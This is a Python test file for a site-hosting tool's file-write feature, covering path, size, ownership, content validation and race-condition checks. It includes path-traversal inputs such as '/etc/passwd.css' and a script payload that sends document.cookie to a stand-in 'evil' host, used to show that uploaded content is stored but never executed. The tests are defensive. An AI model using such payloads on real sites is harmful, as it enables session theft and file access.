"""The write_file tool: submission checks, the validate→write chain, progress.

Bad paths, extensions, and sizes fail the tool call at once; the content
check and the write itself run as their own job chain, so ``deploy()``
runs two jobs per accepted submission and a rejection fails for good —
no retries.
"""

import asyncio

import pytest
from fastmcp.exceptions import ToolError

from cervo import server, user, website, worker
from cervo.db import connect
from tests.conftest import OWNER, call, chat, deploy

HTML = "<!doctype html><title>hi</title><h1>Hello</h1>"
CSS = "body { color: rebeccapurple; }"


def created(slug: str, email: str = OWNER) -> website.Website:
    with connect() as conn:
        owner = user.ensure(conn, email)
        return website.create(conn, slug, owner)


def state_of(
    slug: str, path: str, content: str, email: str = OWNER
) -> website.FileWrite:
    with connect() as conn:
        user_id = user.ensure(conn, email).id
        state = website.file_state(conn, slug, path, content, user_id)
    assert state is not None
    return state


@pytest.mark.parametrize(
    "path",
    [
        "../evil.html",
        "a/../../b.html",
        "/etc/passwd.css",
        "..\\win.html",
        "a//b.html",
        ".hidden.html",
        "a/.git/x.html",
        "%2e%2e%2fx.html",
    ],
)
async def test_a_path_that_leaves_the_site_is_rejected(path):
    created("mysite")
    async with chat() as c:
        with pytest.raises(ToolError):
            await call(c, "write_file", slug="mysite", path=path, content=HTML)


@pytest.mark.parametrize(
    "path", ["notes.txt", "app.js", "x.html.exe", "x.HTML", "noext"]
)
async def test_a_file_that_is_not_html_or_css_is_rejected(path):
    created("mysite")
    async with chat() as c:
        with pytest.raises(ToolError):
            await call(c, "write_file", slug="mysite", path=path, content=HTML)


async def test_content_over_the_size_cap_is_rejected():
    created("mysite")
    async with chat() as c:
        with pytest.raises(ToolError):
            await call(
                c,
                "write_file",
                slug="mysite",
                path="big.html",
                content="a" * (website.MAX_FILE_BYTES + 1),
            )


async def test_the_size_cap_counts_bytes_not_characters():
    created("mysite")
    # Two bytes per character: under the schema's character cap, over 1 MiB.
    content = "é" * (website.MAX_FILE_BYTES // 2 + 1)
    async with chat() as c:
        with pytest.raises(ToolError, match="1 MiB"):
            await call(c, "write_file", slug="mysite", path="big.html", content=content)


async def test_writing_into_someone_elses_site_is_refused():
    created("mysite")
    async with chat("intruder@example.com") as c:
        with pytest.raises(ToolError, match="someone else"):
            await call(c, "write_file", slug="mysite", path="a.html", content=HTML)


async def test_writing_into_a_site_that_does_not_exist_is_refused():
    async with chat() as c:
        with pytest.raises(ToolError, match="no site"):
            await call(c, "write_file", slug="nowhere", path="a.html", content=HTML)


def test_the_service_rejects_unsafe_paths_without_the_schema():
    """The tool's pattern is the first line of defense, not the only one."""
    with pytest.raises(website.WebsiteError):
        website.file_target("mysite", "../escape.html")
    with pytest.raises(website.WebsiteError):
        website.file_target("mysite", "nested/../../escape.css")
    with pytest.raises(website.WebsiteError, match=r"html and \.css"):
        website.file_target("mysite", "script.js")


def test_a_symlink_out_of_the_site_directory_is_caught(data_dir):
    site_dir = data_dir / "mysite"
    site_dir.mkdir()
    (site_dir / "link").symlink_to(data_dir.parent)
    with pytest.raises(website.WebsiteError, match="escapes"):
        website.file_target("mysite", "link/x.html")


async def test_a_submitted_file_is_written_through_the_chain(data_dir, caddy_reloads):
    created("mysite")
    deploy()
    async with chat() as c:
        result = await c.call_tool(
            "write_file",
            {"slug": "mysite", "path": "blog/post.html", "content": HTML},
        )
    submitted = result.structured_content
    assert submitted["status"] == "pending"  # conftest pins the window to zero
    assert submitted["steps_total"] == 2
    assert submitted["url"] == "http://mysite.localhost/blog/post.html"

    assert deploy() == 2  # validate, write
    assert (data_dir / "mysite" / "blog" / "post.html").read_text() == HTML
    state = state_of("mysite", "blog/post.html", HTML)
    assert (state.status, state.error) == ("done", None)
    assert caddy_reloads == [True]  # the site's own deployment; the file adds none


async def test_the_chain_advances_one_step_at_a_time():
    created("mysite")
    deploy()
    async with chat() as c:
        await call(c, "write_file", slug="mysite", path="style.css", content=CSS)

    state = state_of("mysite", "style.css", CSS)
    assert (state.status, state.step, state.steps_done) == (
        "pending",
        "checking the file's content",
        0,
    )
    assert worker.run_once()
    state = state_of("mysite", "style.css", CSS)
    assert (state.status, state.step, state.steps_done) == (
        "working",
        "writing the file",
        1,
    )


async def test_the_owner_can_replace_the_default_page(data_dir):
    created("mysite")
    deploy()
    assert "mysite" in (data_dir / "mysite" / "index.html").read_text()
    async with chat() as c:
        await call(c, "write_file", slug="mysite", path="index.html", content=HTML)
    deploy()
    assert (data_dir / "mysite" / "index.html").read_text() == HTML


async def test_content_that_is_not_text_fails_for_good(data_dir):
    created("mysite")
    deploy()
    async with chat() as c:
        await call(
            c, "write_file", slug="mysite", path="evil.html", content="bin\x00ary"
        )
    assert deploy() == 1  # the validate step, once — no retries
    assert deploy() == 0

    state = state_of("mysite", "evil.html", "bin\x00ary")
    assert state.status == "failed"
    assert "not text" in state.error
    assert not (data_dir / "mysite" / "evil.html").exists()


def test_the_content_check_reads_css_structurally():
    website.check_content("a.css", CSS)
    website.check_content("a.css", "/* unclosed comment")
    website.check_content("a.css", "@media (min-width: 5px) { body { }")  # unclosed
    website.check_content("a.css", 'a::before { content: "}<b>"; }')  # inside a string
    with pytest.raises(website.WebsiteError, match="stray"):
        website.check_content("a.css", "} body {")
    with pytest.raises(website.WebsiteError, match="reads as HTML"):
        website.check_content("a.css", "  <!doctype html><p>hi")
    with pytest.raises(website.WebsiteError, match="reads as HTML"):
        website.check_content("a.css", "/* a comment */ <html>")


def test_the_content_check_tolerates_sloppy_html():
    website.check_content("a.html", "<p>unclosed<div><b>nested wrong</p>")
    website.check_content("a.html", "just some text, no tags")


def test_the_content_check_rejects_broken_unicode():
    """A lone surrogate is not encodable text, and NUL bytes are not text."""
    with pytest.raises(website.WebsiteError, match="not valid text"):
        website.check_content("a.html", "before\ud800after")
    with pytest.raises(website.WebsiteError, match="NUL"):
        website.check_content("a.css", "body{}\x00")


def test_the_content_check_does_not_choke_on_pathological_input():
    """Deeply nested markup and braces must be read, not recursed into a
    crash or hang — the validators are linear scanners, not tree builders."""
    website.check_content("a.html", "<div>" * 50_000 + "x" + "</div>" * 50_000)
    website.check_content("a.css", "@media all {" * 50_000 + "}" * 50_000)
    # a real structural error is still caught, however deep
    with pytest.raises(website.WebsiteError, match="stray"):
        website.check_content("a.css", "}" * 50_000)


async def test_active_content_is_stored_verbatim_never_executed(data_dir):
    """cervo hosts whatever HTML/CSS an owner writes — scripts included — but
    only ever writes bytes to disk; nothing in the pipeline evaluates them."""
    payload = "<script>fetch('//evil/'+document.cookie)</script>"
    created("mysite")
    deploy()
    async with chat() as c:
        await call(c, "write_file", slug="mysite", path="xss.html", content=payload)
    assert deploy() == 2
    assert (data_dir / "mysite" / "xss.html").read_text() == payload


async def test_a_site_deleted_mid_chain_is_not_resurrected(data_dir):
    created("mysite")
    deploy()
    async with chat() as c:
        await call(c, "write_file", slug="mysite", path="late.html", content=HTML)
    assert worker.run_once()  # validation passes while the site still exists

    with connect() as conn:
        owner = user.ensure(conn, OWNER)
        website.delete(conn, "mysite", owner)
    deploy()  # the write must refuse; the delete then removes the directory

    assert not (data_dir / "mysite").exists()
    state = state_of("mysite", "late.html", HTML)
    assert state.status == "failed"
    assert "deleted" in state.error


async def test_a_slug_retaken_mid_flight_gets_no_foreign_write(data_dir):
    """A write queued by the old owner must never land in the new owner's site.

    The mirror of the delete_file race: an owner submits a write, loses the
    slug (deletes it, someone else takes it), and the stale write chain then
    runs against a site that is now someone else's. The content must never
    be written, exactly as a deletion carrying a stale owner is refused.
    """
    created("mysite")
    deploy()
    async with chat() as c:  # the owner submits a write...
        await call(c, "write_file", slug="mysite", path="planted.html", content=HTML)

    with connect() as conn:  # ...then the slug changes hands
        owner = user.ensure(conn, OWNER)
        website.delete(conn, "mysite", owner)
        newcomer = user.ensure(conn, "newcomer@example.com")
        website.create(conn, "mysite", newcomer)

    deploy()  # the stale write chain runs against the newcomer's fresh site

    assert not (data_dir / "mysite" / "planted.html").exists()  # never written
    with connect() as conn:
        row = conn.execute(
            "SELECT status, error FROM job WHERE payload LIKE ? ORDER BY id DESC LIMIT 1",
            ("%planted.html%",),
        ).fetchone()
    assert row["status"] == "failed"
    assert "deleted" in row["error"]


async def test_an_identical_submission_in_flight_is_not_queued_twice():
    created("mysite")
    deploy()
    async with chat() as c:
        await call(c, "write_file", slug="mysite", path="a.html", content=HTML)
        again = await c.call_tool(
            "write_file", {"slug": "mysite", "path": "a.html", "content": HTML}
        )
    assert again.structured_content["status"] == "pending"
    with connect() as conn:
        (count,) = conn.execute(
            "SELECT count(*) FROM job WHERE kind = ?", (website.VALIDATE_FILE_KIND,)
        ).fetchone()
    assert count == 1
    assert deploy() == 2


async def test_a_followed_write_streams_progress(monkeypatch, data_dir):
    """A client that sends a progress token sees each step and gets 'done'."""
    created("followed")
    deploy()
    monkeypatch.setattr(server, "_FOLLOW_POLL", 0.02)
    monkeypatch.setattr(server, "_FOLLOW_FOR", 30)
    updates = []

    async def on_progress(progress, total, message):
        updates.append((progress, total, message))

    async def pump():  # the worker service, one job at a time
        while True:
            await asyncio.sleep(0.05)
            await asyncio.to_thread(worker.run_once)

    async with chat() as c:
        pumping = asyncio.create_task(pump())
        try:
            result = await c.call_tool(
                "write_file",
                {"slug": "followed", "path": "blog/post.html", "content": HTML},
                progress_handler=on_progress,
            )
        finally:
            pumping.cancel()

    state = result.structured_content
    assert state["status"] == "done"
    steps = [progress for progress, _, _ in updates]
    assert steps[0] == 0 and steps[-1] == 2
    assert steps == sorted(steps)
    assert all(total == 2 for _, total, _ in updates)
    assert updates[-1][2] == "written to http://followed.localhost/blog/post.html"
    assert (data_dir / "followed" / "blog" / "post.html").read_text() == HTML
